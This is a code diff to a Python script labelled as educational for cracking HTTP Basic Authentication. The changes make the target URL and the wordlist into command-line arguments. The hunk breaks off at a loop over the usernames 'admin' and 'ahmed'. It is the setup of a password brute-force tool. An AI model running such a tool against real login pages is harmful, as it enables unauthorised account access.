@@ -5,17 +5,22 @@
 # Purpose: ducational purpose (Cracking Basic Authentication)
 
 from sys import argv
+import os.path
 import requests
 import base64
 from colorama import Fore as foreground
 
-if len(argv) != 2:
-	print "Usage:\n\t python %s worldlist.txt\n"%argv[0]
+if len(argv) != 3:
+	print "Usage:\n\t python %s <wordlist> <url>\n"%argv[0]
+	exit(1)
+if(os.path.isfile(argv[1])):
+	wordlist = open(argv[1], "r")
+else:
+	print "Error:\n\t Wordlist not found!\n"
 	exit(1)
 
-wordlist = open(argv[1], "r")
 # Login Page URL
-url = 'http://172.16.122.2/secret'
+url = argv[2]
 words = wordlist.readlines()
 
 for user in ["admin", "ahmed"] :
